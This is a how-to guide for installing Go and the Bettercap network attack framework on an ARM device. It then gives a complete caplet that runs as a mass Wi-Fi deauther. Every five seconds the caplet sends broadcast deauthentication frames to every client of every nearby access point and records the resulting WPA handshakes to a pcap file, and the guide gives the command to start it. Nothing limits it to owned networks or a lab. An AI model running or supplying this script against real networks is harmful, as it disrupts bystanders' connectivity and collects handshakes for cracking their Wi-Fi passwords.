# Bettercap
## Installing GO
As bettercap uses GO we will install this first. Update the number if Go got a newer version available.
```
wget https://go.dev/dl/go1.17.5.linux-armv6l.tar.gz
# extract to /usr/local/go
sudo rm -rf /usr/local/go
sudo tar -C /usr/local -xzf go1.17.5.linux-armv6l.tar.gz
```

We now need to add the PATH environment variable that are required for the system to recongize where the Golang is installed. To do that, edit the `~/.profile` file. Scroll all the way down to the end of the file and add the following:
```bash
PATH=$PATH:/usr/local/go/bin
GOPATH=$HOME/golang
```

Feel free to change the `GOPATH=$HOME/golang` to something else. Finally we need to make the system aware of the new profile, run `source ~/.profile`

Type `which go` to find out where the Golang installed and `go version` to see the installed version and platform.

## Installing Bettercap
Now, with GO installed, we are able to install Bettercap
```bash
sudo apt install libpcap-dev libnetfilter-queue-dev libusb-1.0-0-dev build-essential
go install github.com/bettercap/bettercap@latest
# copy bettercap to use it directly
sudo cp go/bin/bettercap /usr/bin/
# install the caplets and the web ui in /usr/local/share/bettercap and quit
sudo bettercap -eval "caplets.update; ui.update; quit"
```

### Workflow

### Adding Caplets to bettercap
We will save all Caplets in a shared folder: `cd /usr/share/bettercap/captlets`

A simple caplet can look like this:
```bash
# More info about this caplet: https://twitter.com/evilsocket/status/1021367629901115392

set $ {bold}😈 » {reset}

# make sure wlan0 is in monitor mode
# ref: https://github.com/offensive-security/kali-arm-build-scripts/blob/master/rpi3-nexmon.sh
!monstop
!monstart

# every 5 seconds:
# - clear the screen
# - show the list of nearby access points 
# - deauth every client from each one of them
set ticker.period 5
set ticker.commands clear; wifi.show; wifi.deauth ff:ff:ff:ff:ff:ff
# sniff EAPOL frames ( WPA handshakes ) and save them to a pcap file.
set net.sniff.verbose true
set net.sniff.filter ether proto 0x888e
set net.sniff.output wpa.pcap

# uncomment to only hop on these channels:
# wifi.recon.channel 1,2,3
wifi.recon on
ticker on
net.sniff on

# we'll see lots of probes after each deauth, just skip the noise ...
events.ignore wifi.client.probe
# start fresh
events.clear
clear
```

To start bettercap with this caplet run:
```bash
ifconfig wlan0 up
bettercap -iface wlan0 -caplet /usr/share/bettercap/caplets/<caplet-name>.cap
```

# Sources and more
[Evilsocket](https://www.evilsocket.net/2018/07/28/Project-PITA-Writeup-build-a-mini-mass-deauther-using-bettercap-and-a-Raspberry-Pi-Zero-W/)

[Bettercap](https://www.bettercap.org/)

[CyberPunk.rs](https://www.cyberpunk.rs/install-mitm-attack-framework-bettercap)